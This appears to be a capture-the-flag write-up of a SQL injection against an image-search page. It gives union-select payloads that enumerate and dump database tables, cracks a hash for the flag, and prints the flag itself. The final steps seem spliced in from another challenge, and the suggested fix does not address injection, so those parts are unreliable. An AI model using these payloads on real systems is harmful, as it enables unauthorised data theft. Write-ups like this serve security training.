# Where: <br>
    /?page=searchimg
# How:
-By entering:

    -1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()

-We get the following output:

    ID: -1 union select null, concat (table_name) from information_schema.tables where table_schema = database () 
    Title: list_images
    Url :
    
-This tells us that the only table is *list_images*.

-We then enter:

    -1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()

-We get the following output:

    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: id
    Url : 
    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: url
    Url : 
    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: title
    Url : 
    ID: -1 union select null, concat (column_name) from information_schema.columns where table_schema = database () 
    Title: comment
    Url :
    
-This tells us that there are the following columns: *id*, *url*, *title* and *comment*.

-We then enter:

    -1 union select NULL, concat (id, url, title, comment) from list_images

-We get all the images' information.
-The 5th image has the following comment that give us a string and instructions:

    Hack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

-If we decrypt *1928e8083cf461a51303633093573c46* at [MD5 Online](https://www.md5online.org/md5-decrypt.html)
Or
-Add an invalid option.
-Select the invalid value
-Receive the flag
# Flag:
03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA
# Fix:
Store options server side/on backend.All user input should be sanitised and validated (backend).
